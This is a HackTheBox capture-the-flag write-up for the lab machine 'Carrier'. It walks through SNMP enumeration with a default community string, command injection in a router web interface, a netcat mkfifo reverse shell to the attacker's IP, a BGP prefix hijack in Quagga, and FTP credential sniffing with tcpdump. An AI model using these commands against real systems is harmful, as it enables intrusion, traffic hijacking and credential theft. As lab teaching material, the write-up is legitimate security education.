---
title: "HackTheBox Writeup: Carrier"
date: 2019-08-22T15:50:01+02:00
tags:
  - hackthebox
  - writeup
  - ctf
---

![img](/images/carrier-writeup/1.png)

When I first tackled Carrier it was the box with the most difficult path to root I had faced, but it's difficult in a very fun and most importantly interesting and educative way, so this box falls straight in my list of favorites, as it allowed me to explore new techniques, tools, and sharpen my enumeration skills. To get user access to the box I found a command injection flaw in the web application, where I logged in with the details found by querying SNMP. Finally, to grab the root flag I performed a BGP hijacking attack to change the routing options of a neighbor network, allowing me to see FTP traffic in that network containing the credentials to the server where the file was hosted.

---

## Enumeration

As usual, let's start from scanning the target with nmap:

![img](/images/carrier-writeup/2.png)

I performed two different scans, the first took a long time because it's an UDP scan (-sU), the second launched a SYN scan to find open TCP ports, and both reported some very interesting results. The UDP scan shows we are dealing with a DHCP server and an SNMP service, the first of the two indicates we may have to do with a router, the second could be very useful to gather more information about our target, given we know the right community string, which is more or less the equivalent of a password in the SNMP protocol. 

Some of the TCP ports shown in the second scan are not going to respond, but that's not an issue because the most interesting part begins when we connect to the HTTP service, which is running an Apache web server and presents to us with a login form:

![img](/images/carrier-writeup/3.png)

The first thing one does in these cases is trying common default user/password combinations, but none seems to work and the same can be said for the popular SQL injection-based login bypass methods. Let's move our attention somewhere else then, for example, we should take note of the two error codes shown in the page, and launch a content discovery scan with a program like dirb, gobuster, or wfuzz to see if we can find any other files and directories on the server. The common.txt dictionary that comes with dirb is often enough:

![img](/images/carrier-writeup/4.png)

Some of these directories contain very valuable information. First of all the /debug/ folder contains a page that loads phpinfo() for us, letting us see a detailed overview of the PHP configuration:

![img](/images/carrier-writeup/5.png)

However it is pretty useless when compared to the /doc/ folder, which is listable and so we can see every file it contains. First we have a picture called diagram_for_tag.png that shows three different routers, each apparently belonging to three different networks of three different companies:

![img](/images/carrier-writeup/6.png)

And then a document called error_codes.pdf, which appears to be an extract from the device's user manual describing the meaning of every possible error code the web interface can present when something goes wrong. We did see two error codes in the login page, so now we can see what they mean:

![img](/images/carrier-writeup/7.png)

Finally, for completion, in the /tools/ folder there is a remote.php file that doesn't load because of the expired license, just as the error said:

![img](/images/carrier-writeup/8.png)

Let's think about the other error code though, the one saying credentials for login haven't been changed from the default settings: we can tell from the document that an account called "admin" exists, and that its password is the serial number found on the chassis of the device. Obviously we can't see that remotely, but if you remember the the results of the UDP scan from earloer we have found a SNMP service running on the target, and SNMP is used to store, obtain, and update information about a device and its state, so interrogating that service could give us some juicy info. To do that we can install snmpwalk:


    $ sudo apt-get install snmpwalk

Now, normally SNMP would require something called "community string" to accept a connection and thus respond to our queries, but it just so happens that there exists a default setting for this community string, which is literally "public", which we can attempt to use to contact the router in the hope of finding a default installation of the service that doesn't require any further guessing, investigation work, or mere bruteforcing:


![img](/images/carrier-writeup/9.png)

And it worked like a charm! The -c flag specifies the community string to use for authentication and -v tells the router which version of the protocol to use, in this case SNMPv1. What we receive is a single string, "SN#NET_45JDX23", which we can guess being the serial number of our target. Let's try it out!


    User: admin
    Pass: NET_45JDX23

![img](/images/carrier-writeup/10.png)

We made it to the web interface! It only takes a few seconds of inspection to find an interesting feature in the Diagnostics tab:

![img](/images/carrier-writeup/11.png)

Clicking the "Verify status" button makes the page load what looks like the output of a shell command, and by examining the source code of the page we can find something incredibly useful to say the least:

![img](/images/carrier-writeup/12.png)

Clicking the "Verify status" button makes the page load what looks like the output of a shell command, and by examining the source code of the page we can find something incredibly useful to say the least:

![img](/images/carrier-writeup/13.png)

---

## Exploitation: getting user

From this we can conclude that the web application tells the user running the service what parameters to give to the Diagnostics script, and once the script is executed its output is received. Since we can control what parameters to give the script, and it appears like the script would be something that reports the current status of a service called quagga, we can just append a semicolon to it to terminate that instruction and insert our own, encode it in base64, send everything in a POST request, and we will have achieved RCE:

    quagga;ls -la ---> cXVhZ2dhO2xzIC1sYQ==

![img](/images/carrier-writeup/14.png)

It worked and we can even see user.txt in the same folder! Before we grab it we can try to get proper shell access to the box though, we can do it with nc, with the "long version" of the reverse shell command, as it appears that the version installed doesn't support the -e flag:


    quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 9595 >/tmp/f

![img](/images/carrier-writeup/15.png)

I used Burp Repeater to send the modified POST request containing our nc payload after starting a listener on my own box, and as soon as the router executed the script I received a remote shell from it, which gave me root access to the device. Despite being root the root flag is nowhere to be found, so we will have to investigate and see if there is any other computer we have to interact with, but in the meantime we can read user.txt.

---

## Local enumeration


Now the real fun begins. While looking around in the web application I found a few interesting things in the Tickets tab:


![img](/images/carrier-writeup/16.png)

Apparently the system we are using right now was misconfigured and caused a leak of routes of the ISP, we also have a few IP addresses of networks, including a range of IPs where an important FTP server is supposed to be. This should be a obvious hint on the fact that we must find out more about who else this device is talking to, if it has any suspicious entries, and if we can contact anyone else of the above mentioned devices. To start, we can take a look at the network interfaces installed on this device and what they are connected to:

![img](/images/carrier-writeup/17.png)

We find three different addresses, which leads me to believe the diagram we found on the web application where two other devices are talking to each other, one of which being our own, the one called "Lyghtspeed Networks", is basically a representation of the state of this router, connected to two more networks that we have seen are called "ZaZa TeleCom" and "CastCom", which have their own device numbers, AS200 and AS300, while we currently are on the AS100 device. We can confirm this by exploring the quagga folder, the one used by the web application, which I found by accident while looking inside the /opt/ directory after finding a shell script called restore.sh:

    !/bin/sh
    systemctl stop quagga
    killall vtysh
    cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
    cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
    systemctl start quagga

This script stops the quagga service to restore the original configuration files, including one that clearly has to do with BGP, the Border Gateway Protocol, before starting it again. Let's take a closer look at these two configuration files:

![img](/images/carrier-writeup/19.png)
![img](/images/carrier-writeup/20.png)

The most interesting file is of course the first one, where we find the two IP addresses of the two routers I mentioned above. Those two lines tell to add entries to the routing table for the addresses 10.78.10.2 and 10.78.11.2, so we should be able to find them by checking the routing tables with the route command:

![img](/images/carrier-writeup/21.png)

Here we can see that 10.100.*.0 (10.100.0.0/16 in CIDR notation) addresses are routed to 10.78.10.2, which is AS200 from ZaZa TeleCom, and addresses from 10.120.*.0 (10.120.0.0/16) are routed to 10.78.11.2, which on the other hand is CastCom's AS300. We now have enough information to start looking into these networks, what should we do first? Well, remember that ticket from before? It said an important FTP server was in the 10.120.15.0 network, so we should start from there. We are dealing with an entire network here and we do not know how many devices are connected to it, let alone their addresses, so we can download a version of nmap on the box and use it to make a full scan of the network. The version I used comes from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and I downloaded it on the box with wget after starting a temporary web server on my Kali VM using PHP. Once the file has been downloaded on the box we can make it executable with chmod +x and then start a scan for the 10.120.15.0/24 network, which will result in finding two live hosts:

![img](/images/carrier-writeup/22.png)

10.120.15.1 has BGP running so it's obviously the router, while 10.120.15.10 turns out to be the server we've been looking for. The question is... does it allow anonymous access?

![img](/images/carrier-writeup/23.png)

Actually it does, but we can't see anything with the anonymous account so we'll have to find a valid one. We know a good amount of information about the layout of these networks so before planning an attack I like to create a visual representation of what we are working with:

![img](/images/carrier-writeup/24.png)

This is an approximation of our current situation: we have control of AS100, which can communicate with AS200 and AS300, each of which has its own network of devices that can all talk to each other thanks to the routes defined by the BGP protocol. We want to log in on the FTP server because we know it holds valuable files, and we think that's where our dear root flag should be at, so to do that we could perform a BGP hijack to change the routes and intercept the FTP login of an user from the AS200 network. We need to change a few settings around to do that, I'm going to cover all of them and an explanation on what each one of them does.

---

## Final exploitation

The restore.sh script killed a process called vtysh, which is the Quagga terminal from where we can change every routing setting. We're going to work with this program for a little bit so first of all we need to prevent the restore.sh script from running while we're working, since it's part of a cron job that is being executed every 10 minutes. Renaming the file or using "chmod -x restore.sh" are both good options to do this, then we can move on to vtysh. After booting it up we can run the "show running-config" command to see the configuration we already noticed from the folder of the program itself:

![img](/images/carrier-writeup/25.png)

From this we can tell our router has an AS of 100 (AS numbers are used as blocks of IP addresses and to refer to other BGP routers), and we find the definitions of our two neighbors: ZaZa TeleCom (AS200) and CastCom (AS300), each with their IP addresses.

Now, because we want to intercept the traffic directed to the FTP server, of which we already have the address, we have to introduce new routes that will be advertised across the neighbors and that will allow our box to receive the connection instead. To do this we are going to create a new range of IP addresses, which will of course contain the one we're interested in:

![img](/images/carrier-writeup/26.png)

The first command let me enter in configure mode, the second defines a list of prefixes called "baudy" which is equal to the addresses in CIDR notation that go from 10.120.15.1 to 10.120.15.127, I chose this range because it's more specific than a /24 range, which includes every 255 addresses from the last IPv4 octet, this means that if there already is a route for that range of addresses but a request comes from an IP that is part of my own range it will follow my route instead because it's more specific and it will be granted priority over the original route. Next we have to tell to who advertise the new route and how to treat the others in a way that do not interfere with our new settings, so here are all the steps, each explained:

![img](/images/carrier-writeup/27.png)

1. Enter the configuration mode
+ Add a new list of prefixes called "baudy", which contains the range of our interest
+ We use the "route-map" command to set a new entry in the routing tables that involve routing to AS200, with priority of 10, so the first check
+ We want to set a condition for the requests coming from IPs that are part of our list
+ The condition we add is to not advertise our new route to anyone else (AS300), or else we won't be able to receive the traffic correctly
+ A second check for the same block (AS200) for every other IP address is to just allow everything without adding any other setting
+ Now we switch to the other neighbor and tell that we do not want it to advertise our new route, it only has to do with AS200
+ We check if a packet directed to AS300 is part of our range
+ Otherwise permit
+ Now we change context to our own router: AS100
+ We add a new network to advertise, including base address and subnet mask, which is equal to saying 10.120.15.0/25
+ Quit the configuration mode

Once we have completed these steps we have to clear our current routes and re-adveirtse them from scratch, we do that with this command while still in the vtysh console:

    r1# clear ip bgp * out

When put together, what we did was essentially tell AS200 to come talk to us when he wants to contact the FTP server, but at the same time we made sure AS300 didn't know about this new rule we just put up so that once we receive the packets from AS200 we can forward them to AS300, and once there the third router would receive an answer from the FTP server, and send it to AS200 as intended. If our new route was to be advertised to AS300 then there would be no successful FTP connection, because if AS300 was aware of our new route it wouldn't pass requests to the FTP server directly, it would send it back to us because its routing table said we know where to find the FTP server, and then we would send it back to AS300, causing a loop that would eventually bring the TTL field of the packets to reach zero and thus die.

Now that we have successfully hijacked the BGP entries we can fire up tcpdump on the box to listen for FTP packets:

    root@r1:/opt# tcpdump -i eth2 'port 21' -w baudy.pcap

After waiting for a minute or two we encode the file in base64 so we can copy and paste the string in a file on our attacker box:

    root@r1:/opt# base64 -w0 baudy.pcap

Then decode it into a pcap file for Wireshark:

    baud@fooxy:~$ base64 -d carrier > carrier.pcap

And now we should find the FTP credentials in the capture file:

![img](/images/carrier-writeup/28.png)

    User: root
    Pass: BGPtelc0rout1ng

With these we can finally grab the root flag by logging in the FTP server.




